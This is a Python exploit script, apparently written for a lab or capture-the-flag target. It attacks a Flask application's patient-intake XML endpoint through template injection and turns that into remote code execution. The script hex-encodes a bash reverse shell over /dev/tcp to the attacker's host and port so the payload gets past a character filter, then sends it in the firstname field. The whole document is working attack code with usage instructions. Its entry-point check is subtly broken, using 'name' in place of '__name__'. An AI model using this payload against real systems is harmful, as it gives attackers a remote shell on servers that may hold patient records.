#!/usr/bin/env python3
import urllib.request
import binascii
import sys

# Exploit: SSTI to RCE via Hex Encoding Bypass
# Target: Flask App using unsafe eval() in templates

def exploit(target_ip, lhost, lport):
    target_url = f"http://{target_ip}:54321/addPatient"
    
    # Reverse shell command - optimized for bash
    cmd = f"__import__('os').system('bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"')"

    # Hex encoding to bypass the alphanumeric-only regex (No spaces allowed)
    hex_cmd = binascii.hexlify(cmd.encode()).decode()
    
    # Final Payload: Using eval + hex bypasses strict character filtering
    payload = "{" + f"eval(bytes.fromhex('{hex_cmd}').decode())" + "}"

    # XML Data structure with the malicious payload in <firstname>
    xml_data = f"""<patient>
        <firstname>{payload}</firstname>
        <lastname>Exploit</lastname>
        <sender_app>Mirth</sender_app>
        <timestamp>2026</timestamp>
        <birth_date>01/01/2000</birth_date>
        <gender>M</gender>
    </patient>"""

    print(f"[*] Targeting: {target_url}")
    print(f"[*] Sending payload for Reverse Shell to {lhost}:{lport}...")
    
    req = urllib.request.Request(target_url, data=xml_data.encode(), headers={'Content-Type': 'application/xml'})

    try:
        urllib.request.urlopen(req)
        print("[+] Request sent successfully!")
    except Exception as e:
        print(f"[!] Note: Connection might have closed (Expected if shell is active). Error: {e}")

if name == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_IP> <YOUR_IP> <YOUR_PORT>")
        sys.exit(1)
        
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
